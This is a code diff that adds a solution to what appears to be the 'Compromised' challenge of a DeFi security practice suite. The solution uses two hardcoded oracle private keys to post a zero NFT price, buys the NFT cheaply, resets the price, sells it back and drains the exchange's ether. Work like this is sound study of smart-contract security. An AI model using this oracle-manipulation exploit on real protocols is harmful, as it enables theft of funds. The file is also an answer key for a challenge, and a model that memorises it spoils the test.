@@ -75,7 +75,43 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        // next private key were generated using the information from the problem description
+        // get the addresses from the private keys
+        address source0 = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        address source1 = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
         
+        // prank as the first trusted source
+        vm.startPrank(source0);
+        // post a very low price for the NFT
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+        // prank as the second trusted source
+        vm.startPrank(source1);
+        // post a very low price for the NFT
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+
+        vm.prank(player);
+        // call Exchange to buy the NFT at the low price
+        uint nftId = exchange.buyOne{value: 0.1 ether}();
+
+        // set the price of the NFT to 999 ether again
+        vm.startPrank(source0);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
+        vm.startPrank(player);
+        // approve the exchange to transfer the NFT
+        nft.approve(address(exchange), nftId);
+        // sell the NFT back to the exchange
+        exchange.sellOne(nftId);
+
+        // send ether to the recovery account
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
     }
 
     /**
